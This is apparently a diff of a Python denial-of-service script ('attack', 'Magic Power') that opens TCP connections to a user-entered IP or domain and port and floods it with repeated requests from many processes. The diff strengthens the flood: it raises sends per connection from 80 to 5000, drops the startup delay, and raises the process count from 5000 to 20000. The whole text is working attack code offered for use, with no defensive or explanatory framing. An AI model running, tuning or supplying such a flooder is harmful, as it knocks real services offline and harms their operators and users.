@@ -35,7 +35,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80):
+      for y in range(5000):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
@@ -47,10 +47,10 @@ ip = input("IP/Domain: ")
 port = int(input("Port: "))
 url = f"http://{str(ip)}"
 print("[>>>] Starting the attack [<<<]")
-sleep(1)
+sleep(0)
 
 def send2attack():
-  for i in range(5000): #Magic Power
+  for i in range(20000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
